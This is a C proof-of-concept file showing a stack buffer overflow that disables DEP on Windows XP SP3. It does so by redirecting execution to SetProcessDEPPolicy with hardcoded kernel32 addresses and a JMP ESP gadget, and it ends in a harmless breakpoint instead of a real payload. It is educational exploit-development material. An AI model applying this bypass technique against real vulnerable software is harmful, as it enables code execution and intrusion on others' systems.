/*
This is a proof of concept of buffer overflow exploitation with DEP
bypass on Windows XP Professional SP3 english updated on December 9,
2009 with DEP manually set to OptOut so enabled for all processes,
except the ones that are put in the exception list and this program
is not.

This source has been compiled with Microsoft Visual C++ 2008 Express
Edition in Release mode with the default flags. This includes
/NXCOMPAT and /GS.

Buffer Security Check (stack cookie, /GS flag) does not need to be
bypassed because the string buffer, buf, in this example is long
4 bytes, so the compiler does not add the GS cookie to the
useSetProcessDEPPolicy() function. Remember that strict_gs_check
pragma by default is turned off.

References:
* 'New NX APIs added to Windows Vista SP1, Windows XP SP3 and Windows
  Server 2008' by Michael Howard, http://blogs.msdn.com/michael_howard/archive/2008/01/29/new-nx-apis-added-to-windows-vista-sp1-windows-xp-sp3-and-windows-server-2008.aspx
* SetProcessDEPPolicy Function, http://msdn.microsoft.com/en-us/library/bb736299%28VS.85%29.aspx

Feel free to write me for comments and questions,
Bernardo Damele A. G. <bernardo.damele@gmail.com>

Blog post: http://bernardodamele.blogspot.com/2009/12/dep-bypass-with-setprocessdeppolicy.html
*/


#include <windows.h>
#include <stdlib.h>


void useSetProcessDEPPolicy()
{
   char buf[4];

   /* Overflow the string buffer and EBP register. */
   strcpy(buf, "AAAABBBB");

   /* SetProcessDEPPolicy() API has been added to Windows Vista SP1,
   Windows XP SP3 and Windows Server 2008 and can be abused by an
   attacker while exploiting a buffer overflow vulnerability to disable
   hardware-enforced DEP (NX/XD bit) for the running process.

   Overwrite EIP with the address of SetProcessDepPolicy() API, which
   is 0x7c8622a4 on a Windows XP SP3 English 32bit system updated on
   December 9, 2009.

   NOTE: You might need to adapt it depending on your system patch
   level. */
   memcpy(buf+8, "\xa4\x22\x86\x7c", 4);

   /* Return address of SetProcessDepPolicy().
   Use an address of a JMP ESP instruction in kernel32.dll to jump to our
   shellcode on the top of the stack.

   NOTE: You might need to adapt it depending on your system patch
   level. */
   memcpy(buf+12, "\x13\x44\x87\x7c", 4);

   /* Argument for SetProcessDepPolicy().
   0x00000000 turn off DEP for this process. */
   memcpy(buf+16, "\x00\x00\x00\x00", 4);

   /* The shellcode to be executed after DEP has been disabled.
   For instance, a breakpoint (INT 3 instruction) to call the
   debug exception handler which will pause the process. */
   memcpy(buf+20, "\xcc", 1);
}


int main()
{
   useSetProcessDEPPolicy();

   return 0;
}
